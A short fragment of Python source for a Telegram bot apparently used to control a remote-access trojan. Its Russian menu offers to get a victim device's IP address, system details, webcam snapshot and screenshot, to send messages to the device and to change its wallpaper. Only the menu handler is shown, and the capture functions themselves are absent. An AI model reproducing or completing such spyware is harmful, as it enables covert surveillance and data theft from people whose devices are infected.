...
def start(message):
	...
	bot.send_message(message.chat.id,
		"""Выберите действие:
Ip Adress - Получить IP адрес
Specifications - Получить информацию о системе
Webcam - Получить снимок камеры устройства
Message - Отправить сообщение на устройство
Input - Отправить сообщение с возможностью ответа
Wallpaper - Сменить обои на устройствe
Sreenshot - Получить снимок экрана

Нажимать по кнопкам в нижней панеле, команды не работают
		""",
		reply_markup=rmk
	)
